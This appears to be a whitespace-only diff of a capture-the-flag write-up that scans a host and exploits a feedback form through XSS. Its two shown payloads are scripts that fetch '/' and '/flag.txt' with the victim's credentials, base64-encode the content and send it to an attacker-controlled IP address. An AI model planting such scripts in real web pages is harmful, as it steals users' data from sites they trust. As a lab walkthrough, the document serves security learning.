@@ -7,8 +7,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 8080 |  http   |
+| 22 | ssh |
+| 8080 | http |
 
 We got two open ports, `ssh` and `http` on port `8080`, let's take a look at the website:
 
@@ -48,12 +48,12 @@ seems like a simple feedback form, but I believe this is vulnerable to XSS, so, 
 As said, this will be our payload:
 
 ```js
-<script>  
-fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})  
-.then(response => response.text())  
-.then(text => {  
-fetch('http://IP:80/' + btoa(text), {mode:'no-cors'});  
-});  
+<script> 
+fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'}) 
+.then(response => response.text()) 
+.then(text => { 
+fetch('http://IP:80/' + btoa(text), {mode:'no-cors'}); 
+}); 
 </script>
 ```
 
@@ -83,12 +83,12 @@ As shown, we successfully exploited [XSS](../../Bug%20Bounty/Vulnerabilities/SER
 
 
 ```js
-<script>  
-fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})  
-.then(response => response.text())  
-.then(text => {  
-fetch('http://10.6.34.159:9001/' + btoa(text), {mode:'no-cors'});  
-});  
+<script> 
+fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'}) 
+.then(response => response.text()) 
+.then(text => { 
+fetch('http://10.6.34.159:9001/' + btoa(text), {mode:'no-cors'}); 
+}); 
 </script>
 ```
 
